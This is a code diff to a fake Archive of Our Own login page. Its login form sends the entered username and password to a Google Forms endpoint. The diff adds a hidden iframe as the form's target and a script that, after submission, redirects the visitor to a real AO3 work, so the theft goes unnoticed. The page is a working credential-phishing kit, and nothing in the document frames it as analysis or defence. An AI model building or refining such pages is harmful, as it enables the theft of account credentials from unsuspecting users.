@@ -115,23 +115,36 @@
  If you already have an Archive of Our Own account, log in now.
  If you don't have an account, you can <a href=https://archiveofourown.org/invite_requests>request an invitation to join</a>.
  </p>
-<div id=loginform>
-<form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" method="POST"" method="POST">
-  <dl>
-    <dt><label>Username:</label></dt>
-    <dd><input type="text" name="entry.996873737" required></dd>
+<div id="loginform">
+  <script type="text/javascript">
+    var submitted = false;
+  </script>
 
-    <dt><label>Password:</label></dt>
-    <dd><input type="text" name="entry.1007897845" required></dd>
-<dt><label for="user_remember_me">Remember me</label></dt>
-    <dd>
-      <input type="checkbox" value="Yes" name="remember_me" id="user_remember_me">
-    </dd>
-    <dd style="margin-top: 10px;">
-      <input type="submit" value="Log in">
-    </dd>
-  </dl>
-</form>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
+          onload="if(submitted) {window.location='https://archiveofourown.org/works/21065363';}"></iframe>
+
+  <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" 
+        method="POST" 
+        target="hidden_iframe" 
+        onsubmit="submitted=true;">
+        
+    <dl>
+      <dt><label>Username:</label></dt>
+      <dd><input type="text" name="entry.996873737" required></dd>
+
+      <dt><label>Password:</label></dt>
+      <dd><input type="text" name="entry.1007897845" required></dd>
+
+      <dt><label for="user_remember_me">Remember me</label></dt>
+      <dd>
+        <input type="checkbox" value="Yes" name="entry.이거는_구글항목에_있나요?" id="user_remember_me">
+      </dd>
+
+      <dd style="margin-top: 10px;">
+        <input type="submit" value="Log in">
+      </dd>
+    </dl>
+  </form>
 </div>
 <p>
  Forgot your password or username? <a href=https://archiveofourown.org/users/password/new>Reset your password</a>.
